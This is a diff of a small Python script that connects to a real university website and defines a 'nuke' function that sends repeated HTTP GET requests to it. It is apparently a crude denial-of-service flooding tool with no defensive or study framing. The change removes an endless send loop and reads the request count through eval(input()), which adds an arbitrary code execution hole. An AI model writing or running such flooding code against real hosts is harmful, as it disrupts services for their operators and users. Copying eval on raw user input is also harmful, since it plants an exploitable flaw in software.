@@ -2,12 +2,11 @@ import socket
 import sys
 import threading
 import time
-num_requests=100
+num_requests=eval(input())
 sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.connect(("jntuh.ac.in", 80))
 def nuke():
-        while True:
-            sock.sendall(bytes("GET / HTTP/1.1\r\nHost: jntuh.ac.in\r\n\r\n","utf-8"))
+    sock.sendall(bytes("GET / HTTP/1.1\r\nHost: jntuh.ac.in\r\n\r\n","utf-8"))
 
 
 
